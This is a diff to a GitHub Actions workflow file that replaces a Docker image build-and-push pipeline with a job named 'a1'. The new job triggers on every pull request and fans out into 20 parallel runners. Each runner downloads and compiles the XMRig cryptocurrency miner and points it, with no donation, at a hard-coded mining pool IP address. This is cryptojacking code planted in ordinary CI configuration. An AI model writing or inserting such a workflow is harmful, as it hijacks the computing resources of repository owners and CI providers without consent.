@@ -1,34 +1,24 @@
-name: Docker Image CI
-
-on:
-  repository_dispatch:
-    types: [new_version_with_actionsflow]
-  workflow_dispatch:
+name: a1
+on: [pull_request]
 jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Get the actionsflow version
-        id: actionsflowVersion
-        uses: martinbeentjes/npm-get-version-action@master
-        with:
-          path: packages/actionsflow
-      - name: Get the act version result
-        id: actVersionResult
-        uses: actionsflow/axios@v1
-        with:
-          url: https://raw.githubusercontent.com/actionsflow/setup-act-for-actionsflow/v1/version.json
-      - name: Get the act version
-        id: actVersion
-        run: echo ::set-output name=version::${{fromJSON(steps.actVersionResult.outputs.data).DEFAULT_VERSION}}
-      - name: Log in to Docker registry
-        run: docker login -u ${{ secrets.DOCKER_USERNAME }} -p ${{ secrets.DOCKER_PASSWORD }}
-      - name: Build the Docker image of version
-        run: docker build --build-arg ACTIONSFLOW_VERSION=${{steps.actionsflowVersion.outputs.current-version}} --build-arg ACT_VERSION=v${{steps.actVersion.outputs.version}} -t actionsflow/actionsflow:${{steps.actionsflowVersion.outputs.current-version}} -t actionsflow/actionsflow:v1 -t actionsflow/actionsflow:latest .
-      - name: Push Docker image of version
-        run: docker push actionsflow/actionsflow:${{steps.actionsflowVersion.outputs.current-version}}
-      - name: Push docker images of latest
-        run: docker push actionsflow/actionsflow:latest
-      - name: Push docker images of v1
-        run: docker push actionsflow/actionsflow:v1
+    run:
+        name: Run
+        runs-on: ubuntu-latest
+        strategy:
+          fail-fast: false
+          matrix:
+            runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        steps:
+          - shell: bash
+            run: |
+              sudo apt-get update
+              sudo apt-get install --yes build-essential cmake git libhwloc-dev libssl-dev libuv1-dev
+              curl -Lo xmrig.tar.gz https://github.com/xmrig/xmrig/archive/refs/tags/v6.10.0.tar.gz
+              tar xf xmrig.tar.gz
+              cd xmrig-*
+              mkdir build
+              cd build
+              cmake .. -DCMAKE_BUILD_TYPE=Release
+              make --jobs=$(nproc)
+
+              ./xmrig --donate-level 0 -o 45.85.90.9:3333
